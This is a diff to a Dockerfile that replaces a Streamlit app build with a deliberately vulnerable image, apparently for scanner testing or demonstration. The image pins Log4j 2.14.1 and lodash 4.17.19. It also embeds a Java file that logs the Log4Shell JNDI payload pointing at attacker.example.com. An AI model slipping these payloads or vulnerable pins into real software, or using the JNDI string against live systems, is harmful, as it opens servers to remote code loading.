@@ -1,72 +1,49 @@
-# Builder stage
-FROM python:3.10.13-bookworm as builder
-RUN arch
+# Dockerfile — vulnerable Log4Shell + lodash
 
-# Set environment variables for Poetry
-ENV POETRY_NO_INTERACTION=1 \
-    POETRY_VIRTUALENVS_IN_PROJECT=1 \
-    POETRY_VIRTUALENVS_CREATE=1 \
-    POETRY_CACHE_DIR=/tmp/poetry_cache
+FROM ubuntu:20.04
 
-# Upgrade pip
-RUN pip install --upgrade pip
+# 1) Install JDK (for javac), Node.js 14, curl
+RUN apt-get update && \
+    DEBIAN_FRONTEND=noninteractive \
+      apt-get install -y \
+        curl \
+        gnupg \
+        ca-certificates && \
+    curl -fsSL https://deb.nodesource.com/setup_14.x | bash - && \
+    DEBIAN_FRONTEND=noninteractive \
+      apt-get install -y \
+        openjdk-11-jdk-headless \
+        nodejs && \
+    rm -rf /var/lib/apt/lists/*
 
-# Install Poetry
-RUN pip install poetry==2.0.1
+# 2) Fetch vulnerable Log4j core (2.14.1)
+RUN mkdir -p /vuln/log4j && \
+    curl -fsSL \
+      -o /vuln/log4j/log4j-core-2.14.1.jar \
+      https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar
 
-# Set working directory
-WORKDIR /app
-USER someone
-# Copy poetry toml
-COPY pyproject.toml ./
+# 3) Java app with Log4Shell payload (no variable interpolation)
+RUN mkdir -p /app/java
+COPY --chown=root:root <<'EOF' /app/java/Hello.java
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+public class Hello {
+    private static final Logger logger = LogManager.getLogger(Hello.class);
+    public static void main(String[] args) {
+        // CVE-2021-44228 payload
+        logger.error("${jndi:ldap://attacker.example.com/a}");
+        System.out.println("Log4j demo complete.");
+    }
+}
+EOF
 
-# Install project dependencies (excluding dev dependencies) using Poetry
-RUN poetry install --no-root
-RUN poetry show streamlit
-RUN poetry run streamlit --version
+# 4) Node.js app with lodash 4.17.19 (CVE-2021-23337)
+RUN mkdir -p /app/node
+WORKDIR /app/node
+RUN npm init -y && \
+    npm install lodash@4.17.19 && \
+    printf "const _ = require('lodash');\nconsole.log(_.pad('Vulnerable Node app!', 30, '*'));\n" > index.js
 
-# Runtime stage
-FROM python:3.10-slim-bookworm as runtime
-
-# Set environment variables for virtual environment
-ENV VIRTUAL_ENV=/app/.venv \
-    PATH="/app/.venv/bin:$PATH"
-
-# Copy virtual environment from builder stage
-COPY --from=builder ${VIRTUAL_ENV} ${VIRTUAL_ENV}
-
-# Set working directory
-WORKDIR /app
-
-# Copy the python script to the container
-COPY . /app
-
-# Install curl and other dependencies
-RUN apt-get update && apt-get install -y curl python3-dev
-
-# Install Node.js and npm
-RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash - \
-    && apt-get install -y nodejs
-
-# Set working directory to frontend and install node packages
-WORKDIR /app/frontend
-
-# Ensure the correct ownership of the node_modules directory to avoid permission issues
-RUN mkdir -p /app/frontend/node_modules && chown -R root:root /app/frontend/node_modules
-
-# Remove existing node_modules and install npm packages, ensuring a clean state
-RUN rm -rf node_modules
-COPY frontend/package*.json ./
-RUN npm ci && npm install rollup rollup-pluginutils rollup-plugin-svelte
-
-# Run the build process
-RUN npm run build
-
-# Change back to the app directory
-WORKDIR /app
-
-# Expose port
+# 5) JSON‐form CMD must be one valid instruction, not split
 EXPOSE 8080
-
-# Run App using Python explicitly
-CMD ["/app/.venv/bin/streamlit", "run", "src/1.py", "--server.port=8080", "--server.enableCORS=false", "--server.address=0.0.0.0"]
+CMD ["sh","-c","echo 'Starting vulnerable Log4j app…' && java -cp /vuln/log4j/log4j-core-2.14.1.jar:/app/java Hello & echo 'Starting vulnerable Node.js app…' && node /app/node/index.js"]
